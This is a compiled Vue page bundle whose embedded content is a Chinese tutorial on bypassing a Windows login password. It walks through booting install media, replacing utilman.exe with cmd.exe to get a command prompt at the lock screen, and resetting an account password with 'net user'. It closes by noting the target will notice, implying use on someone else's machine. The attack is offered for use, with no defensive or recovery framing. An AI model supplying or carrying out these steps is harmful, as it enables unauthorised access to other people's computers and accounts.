import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as s,e as d}from"./app-21d4bb55.js";const i={},n=d(`<p>打开Windows的时候，我们可以看到一个轻松使用的按钮，就是输入密码界面右下角的按钮，点击它会自动调用一个叫做utilman.exe的程序，所以我们只需要把这个程序用cmd.exe进行替换，就可以直接访问控制台，从而修改密码，进而绕过原来的开机密码啦~</p><h2 id="具体实现" tabindex="-1"><a class="header-anchor" href="#具体实现" aria-hidden="true">#</a> 具体实现</h2><p>首先准备一个系统安装盘，这里可以直接用微软官方的程序进行制作，在微软官网下载并且制作就好（U盘应该在8G以及以上）</p><p>进入安装向导以后，输入<code>shift + F10</code>，弹出cmd命令窗口</p><p>首先获取所有可用的驱动器：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>wmic logicaldisk get name
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后进入C盘：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>C:
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>导航到Windows目录下面：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> windows
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>再进入windows32目录下面，这里就是utilman.exe所在的目录啦，直接通过命令修改它的名称：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ren utilman.exe utilman2.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后复制cmd.exe到utilman.exe</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>copy cmd.exe utilman.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后取消Windows安装就好~</p><p>这个时候再次启动Windows，再次点击<code>轻松访问</code>，你会看到一个cmd命令窗口，然后直接使用命令修改用户密码就好：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>net user USER_NAME NEW_PASSWORD
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>撒花撒花~，这样就破解啦（缺点是会被对方发现滴）</p>`,18),l=[n];function c(r,o){return a(),s("div",null,l)}const m=e(i,[["render",c],["__file","绕过Windows开机密码.html.vue"]]);export{m as default};
